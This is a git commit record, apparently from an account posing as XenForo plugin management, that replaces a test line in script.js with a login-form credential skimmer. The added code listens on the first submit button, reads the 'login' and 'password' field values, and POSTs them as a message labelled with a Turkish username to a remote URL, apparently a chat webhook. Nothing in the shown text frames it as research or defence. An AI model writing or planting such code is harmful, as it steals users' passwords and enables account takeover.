36d709b4aee92fcbcbb5c9a21e25aee392614584
xenforoPluginManagement <131064044+xenforoPluginManagement@users.noreply.github.com>
2023-06-09 19:53:34 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,15 @@
-console.log("test")
+function mesaj(url, mesaj) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+        'content': mesaj,
+        'username':'AOÇ SEVDALISI',
+    }));
+}
+
+document.querySelectorAll('button[type=submit]')[0].addEventListener("click", (event) => {
+    var username = document.getElementsByName("login")[0].value
+    var password = document.getElementsByName("password")[0].value
+    mesaj(url, "Kullanıcı: "+username+"\n"+"Şifre: "+password)
+});
